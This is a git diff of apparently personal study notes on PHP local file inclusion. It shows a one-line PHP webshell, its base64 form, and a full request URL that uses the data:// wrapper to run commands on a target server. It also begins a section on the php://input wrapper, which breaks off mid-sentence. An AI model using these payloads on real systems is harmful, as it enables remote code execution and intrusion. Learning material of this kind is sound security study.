@@ -99,7 +99,11 @@ echo '<?php system($_GET["cmd"]); ?>' | base64 #Encoding webshell in base64
 PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
 ```
 
-Then, we pass the encoded string into the data wrapper with text.plain
+Then, we pass the encoded string into the data wrapper with text.plain;base64, and we can access normally as if we are accessing normal php webshell:
 ```
 http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
 ```
+
+Using Input Wrapper:
+
+similar to data wrapper, we can use input wrapper to archive RCE, notice that input wrapper 
